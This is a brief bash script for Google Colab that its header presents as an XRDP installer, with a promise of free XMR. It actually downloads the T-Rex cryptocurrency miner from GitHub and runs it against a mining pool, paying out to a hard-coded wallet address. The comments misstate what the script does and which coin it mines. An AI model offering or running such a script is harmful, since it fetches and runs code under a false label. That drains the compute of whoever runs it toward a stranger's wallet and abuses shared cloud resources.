#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R nim
 
wget https://github.com/trexminer/T-Rex/releases/download/0.25.9/t-rex-0.25.9-linux.tar.gz
tar -xf t-rex-0.25.9-linux.tar.gz
chmod +x ./t-rex
./t-rex -a octopus -o stratum+tcp://pool.woolypooly.com:3094 -u 0xae7fa205fe2fa75979aa624b9b7cef793a46460c -p aHJo -w x7
